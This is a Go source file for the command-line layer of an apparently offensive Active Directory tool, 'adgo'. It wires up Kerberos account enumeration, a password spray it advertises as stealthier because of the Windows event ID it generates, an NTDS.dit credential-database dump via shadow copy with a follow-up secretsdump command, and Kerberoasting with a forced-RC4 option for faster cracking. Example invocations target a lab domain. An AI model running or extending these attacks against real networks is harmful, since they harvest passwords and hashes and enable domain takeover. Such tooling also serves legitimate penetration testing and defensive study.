// cmd/adgo/commands/kerbrute_cmd.go
//
// adgo kerberos userenum  — énumération de comptes via AS-REQ
// adgo kerberos kerspray  — password spray Kerberos (mode 88 uniquement)
// adgo smb ntds           — dump NTDS.dit via VSS
// adgo kerberos kerberoast — avec --force-rc4

package commands

import (
	"context"
	"encoding/hex"
	"fmt"
	"time"

	"adgo/pkg/common"
	"adgo/pkg/kerberos"
	"adgo/pkg/ldap"
	"adgo/pkg/smb"

	"github.com/spf13/cobra"
)

// ============================================================
// adgo kerberos userenum
// ============================================================

var UserEnumCmd = &cobra.Command{
	Use:   "userenum",
	Short: "Enumerate valid domain accounts via AS-REQ (no password needed)",
	Long: `Identify valid domain accounts using Kerberos AS-REQ probing.

How it works:
  - KDC_ERR_PREAUTH_REQUIRED → account exists
  - KDC_ERR_C_PRINCIPAL_UNKNOWN → account does not exist
  - KDC_ERR_CLIENT_REVOKED → account locked/disabled

No credentials needed — port 88 only.

Examples:
  adgo kerberos userenum --users users.txt -d lab.local --dc-ip 192.168.1.10
  adgo kerberos userenum --users users.txt -d lab.local --dc-ip 192.168.1.10 --threads 20`,
	RunE: func(cmd *cobra.Command, args []string) error {
		dcIP, _ := cmd.Flags().GetString("dc-ip")
		usersFile, _ := cmd.Flags().GetString("users")
		threads, _ := cmd.Flags().GetInt("threads")
		delay, _ := cmd.Flags().GetInt("delay")
		domain := common.Domain

		if domain == "" {
			return fmt.Errorf("-d DOMAIN required")
		}
		if usersFile == "" {
			return fmt.Errorf("--users FILE required")
		}
		if dcIP == "" {
			return fmt.Errorf("--dc-ip required")
		}

		cfg := &kerberos.BruteConfig{
			Domain:       domain,
			DCIP:         dcIP,
			UsersFile:    usersFile,
			Threads:      threads,
			Delay:        delay,
			UserEnumOnly: true,
			Verbose:      common.Debug,
		}

		result, err := kerberos.EnumerateUsers(cfg)
		if err != nil {
			return err
		}

		fmt.Println()
		common.NxSummaryHeader("User enumeration complete")
		common.NxSummaryLine("Tested", result.Attempts)
		common.NxSummaryLine("Valid accounts", len(result.ValidUsers))
		common.NxSummaryLine("Duration", result.Duration.Round(time.Second))

		if len(result.ValidUsers) > 0 {
			common.LogSuccess("", fmt.Sprintf("Enumerated %d valid users", len(result.ValidUsers)),
				map[string]interface{}{"users": result.ValidUsers})
		}

		return nil
	},
}

// ============================================================
// adgo kerberos kerspray
// ============================================================

var KerSprayCmd = &cobra.Command{
	Use:   "kerspray",
	Short: "Password spray via Kerberos AS-REQ (stealthier than NTLM spray)",
	Long: `Kerberos password spray — generates Event 4768 instead of 4625.

Examples:
  adgo kerberos kerspray --users users.txt -p Password123 -d lab.local --dc-ip 192.168.1.10
  adgo kerberos kerspray --users users.txt --passwords pass.txt -d lab.local --dc-ip 192.168.1.10`,
	RunE: func(cmd *cobra.Command, args []string) error {
		dcIP, _ := cmd.Flags().GetString("dc-ip")
		usersFile, _ := cmd.Flags().GetString("users")
		passwordsFile, _ := cmd.Flags().GetString("passwords")
		threads, _ := cmd.Flags().GetInt("threads")
		delay, _ := cmd.Flags().GetInt("delay")
		jitter, _ := cmd.Flags().GetInt("jitter")
		stopOnFirst, _ := cmd.Flags().GetBool("stop-on-first")
		domain := common.Domain
		password := common.Password

		if domain == "" || dcIP == "" {
			return fmt.Errorf("-d DOMAIN and --dc-ip required")
		}
		if usersFile == "" {
			return fmt.Errorf("--users FILE required")
		}
		if password == "" && passwordsFile == "" {
			return fmt.Errorf("-p PASSWORD or --passwords FILE required")
		}

		cfg := &kerberos.BruteConfig{
			Domain:        domain,
			DCIP:          dcIP,
			UsersFile:     usersFile,
			PasswordsFile: passwordsFile,
			Password:      password,
			Threads:       threads,
			Delay:         delay,
			Jitter:        jitter,
			StopOnFirst:   stopOnFirst,
			Verbose:       common.Debug,
		}

		result, err := kerberos.KerberosSpray(cfg)
		if err != nil {
			return err
		}

		for _, c := range result.ValidCreds {
			common.SaveCred(domain, c.Username, c.Password, "", "kerspray", false)
		}

		return nil
	},
}

// ============================================================
// adgo smb ntds
// ============================================================

var NTDSCmd = &cobra.Command{
	Use:   "ntds",
	Short: "Dump NTDS.dit via Volume Shadow Copy (VSS) — requires DA",
	Long: `Dump NTDS.dit using VSS shadow copy.

Requires: Domain Admin or Backup Operators + ADMIN$ access.

Examples:
  adgo smb ntds 192.168.1.10 -u admin -p pass -d LAB
  adgo smb ntds 192.168.1.10 -u admin --hash aad3b435... -d LAB --cleanup
  adgo smb ntds 192.168.1.10 -u admin -p pass -d LAB --output ./loot/

After dump:
  impacket-secretsdump -ntds ./loot/xxxx_ntds.dit -system ./loot/xxxx_system.hiv LOCAL`,
	Args: cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		target := args[0]
		output, _ := cmd.Flags().GetString("output")
		cleanup, _ := cmd.Flags().GetBool("cleanup")
		timeout, _ := cmd.Flags().GetInt("timeout")

		user := common.Username
		pass := common.Password
		domain := common.Domain
		ntHashStr := common.NTLMHash

		if user == "" || domain == "" {
			return fmt.Errorf("-u USER and -d DOMAIN required")
		}

		var hashBytes []byte
		if ntHashStr != "" {
			var err error
			hashBytes, err = hex.DecodeString(ntHashStr)
			if err != nil {
				return fmt.Errorf("invalid NT hash: %v", err)
			}
		}

		cfg := &smb.ShadowCopyConfig{
			Target:    target,
			Username:  user,
			Domain:    domain,
			Password:  pass,
			NTHash:    hashBytes,
			OutputDir: output,
			Timeout:   time.Duration(timeout) * time.Second,
			Cleanup:   cleanup,
		}

		result, err := smb.DumpNTDSViaShadowCopy(cfg)
		if err != nil {
			return fmt.Errorf("NTDS dump failed: %v", err)
		}

		common.LogSuccess(target, "NTDS dump via VSS", map[string]interface{}{
			"ntds_path":   result.NTDSPath,
			"system_path": result.SYSTEMPath,
		})

		return nil
	},
}

// ============================================================
// adgo kerberos kerberoast (updated with --force-rc4)
// ============================================================

var kerberoastForceRC4 bool
var kerberoastAnalyze bool

var UpdatedKerberoastCmd = &cobra.Command{
	Use:   "kerberoast",
	Short: "Kerberoast — TGS for SPN accounts (hashcat mode 13100 RC4 / 19700 AES)",
	Example: `  adgo kerberos kerberoast -u john -p pass -d lab.local --dc-ip 192.168.1.10
  adgo kerberos kerberoast -u john -p pass -d lab.local --dc-ip 192.168.1.10 --force-rc4
  adgo kerberos kerberoast -u john -p pass -d lab.local --dc-ip 192.168.1.10 --output hashes.txt`,
	RunE: func(cmd *cobra.Command, args []string) error {
		username, password, domain, dcIP, err := requireCreds(cmd)
		if err != nil {
			return err
		}

		fmt.Printf("[*] Kerberoasting SPN accounts on %s...\n", domain)

		ldapURL := fmt.Sprintf("ldap://%s:389", dcIP)
		bindDN := fmt.Sprintf("%s@%s", username, domain)
		baseDN := domainToBaseDN(domain)

		ldapClient, err := ldap.NewClient(context.Background(), ldapURL, bindDN, password, false)
		if err != nil {
			return fmt.Errorf("LDAP connection failed: %v", err)
		}
		defer ldapClient.Close()

		spnUsers, err := ldapClient.EnumerateSPNs(baseDN)
		if err != nil {
			return fmt.Errorf("SPN enumeration failed: %v", err)
		}

		if len(spnUsers) == 0 {
			fmt.Println("[-] No SPN accounts found")
			return nil
		}

		fmt.Printf("[+] Found %d SPN account(s)\n\n", len(spnUsers))

		var targets []kerberos.SPNTarget
		for _, u := range spnUsers {
			for _, spn := range u.SPNs {
				targets = append(targets, kerberos.SPNTarget{
					Username: u.SAMAccountName,
					SPN:      spn,
				})
			}
		}

		var results []kerberos.KerberoastResult
		if kerberoastForceRC4 {
			fmt.Println("[*] Forcing RC4 enctype (hashcat mode 13100 — faster to crack)")
			results, err = kerberos.KerberoastTargetsRC4(username, domain, password, dcIP, targets, true)
		} else {
			results, err = kerberos.KerberoastTargets(username, domain, password, dcIP, targets)
		}
		if err != nil {
			return err
		}

		var hashes []kerberos.HashcatHash
		for _, r := range results {
			if r.Hash.Hash != "" {
				hashes = append(hashes, r.Hash)
			}
		}

		if len(hashes) == 0 {
			fmt.Println("[-] No hashes captured")
			return nil
		}

		kerberos.PrintHashcatHashes(hashes)

		if kerberoastAnalyze {
			kerberos.AnalyzeKerberoastHashes(results)
		}

		output, _ := cmd.Flags().GetString("output")
		return kerberos.SaveHashcatFile(hashes, output)
	},
}

func init() {
	// userenum
	UserEnumCmd.Flags().String("dc-ip", "", "Domain Controller IP (required)")
	UserEnumCmd.Flags().String("users", "", "File containing usernames (required)")
	UserEnumCmd.Flags().Int("threads", 10, "Parallel threads")
	UserEnumCmd.Flags().Int("delay", 100, "Delay between requests (ms)")

	// kerspray
	KerSprayCmd.Flags().String("dc-ip", "", "Domain Controller IP (required)")
	KerSprayCmd.Flags().String("users", "", "File containing usernames (required)")
	KerSprayCmd.Flags().String("passwords", "", "File containing passwords")
	KerSprayCmd.Flags().Int("threads", 5, "Parallel threads")
	KerSprayCmd.Flags().Int("delay", 500, "Delay between requests (ms)")
	KerSprayCmd.Flags().Int("jitter", 20, "Jitter percentage (0-50)")
	KerSprayCmd.Flags().Bool("stop-on-first", false, "Stop after first valid credential")

	// ntds
	NTDSCmd.Flags().String("output", ".", "Output directory for ntds.dit and SYSTEM hive")
	NTDSCmd.Flags().Bool("cleanup", true, "Delete shadow copy after dump")
	NTDSCmd.Flags().Int("timeout", 60, "Timeout in seconds")

	// kerberoast updated
	UpdatedKerberoastCmd.Flags().String("dc-ip", "", "Domain Controller IP (required)")
	UpdatedKerberoastCmd.Flags().String("output", "", "Output file for hashes")
	UpdatedKerberoastCmd.Flags().BoolVar(&kerberoastForceRC4, "force-rc4", false,
		"Force RC4-HMAC (hashcat mode 13100 — faster to crack)")
	UpdatedKerberoastCmd.Flags().BoolVar(&kerberoastAnalyze, "analyze", false,
		"Show hash type analysis and cracking tips")
	UpdatedKerberoastCmd.MarkFlagRequired("dc-ip")

	KerberosCmd.AddCommand(UserEnumCmd)
	KerberosCmd.AddCommand(KerSprayCmd)
	KerberosCmd.AddCommand(UpdatedKerberoastCmd)
	SMBCmd.AddCommand(NTDSCmd)
}
